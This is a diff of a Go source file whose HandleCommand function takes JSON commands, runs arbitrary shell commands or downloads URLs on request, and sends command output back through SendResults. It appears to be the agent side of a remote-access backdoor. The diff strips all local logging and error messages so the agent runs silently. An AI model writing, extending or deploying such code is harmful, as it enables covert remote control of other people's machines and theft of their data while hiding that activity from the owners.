@@ -1,30 +1,28 @@
 package utils
 
 import (
-	"fmt"
-	"log"
 	"os/exec"
 )
 
-func HandleCommand(result map[string]interface{}) {
-	cmd_type, ok := result["type"].(string)
+func HandleCommand(cmd_json map[string]interface{}) {
+	cmd_type, ok := cmd_json["type"].(string)
 	if !ok {
-		log.Fatal("Correct but no cmd")
+		return
 	}
 
 	if cmd_type == "execute" {
 
-		cmd, ok := result["command"].(string)
+		cmd, ok := cmd_json["command"].(string)
 		if !ok {
-			log.Fatal("Can't read execute cmd")
+			return
 		}
 
 		handleExecute(cmd)
 
 	} else if cmd_type == "download" {
-		url, ok := result["url"].(string)
+		url, ok := cmd_json["url"].(string)
 		if !ok {
-			log.Fatal("Can't read download url")
+			return
 		}
 
 		handleDownload(url)
@@ -41,11 +39,8 @@ func handleExecute(cmd string) {
 
 	output, err := command.Output()
 	if err != nil {
-		fmt.Println("Error executing command:", err)
 		return
 	}
 
 	SendResults(output)
-
-	fmt.Printf("Sent results\n, %s", output)
 }
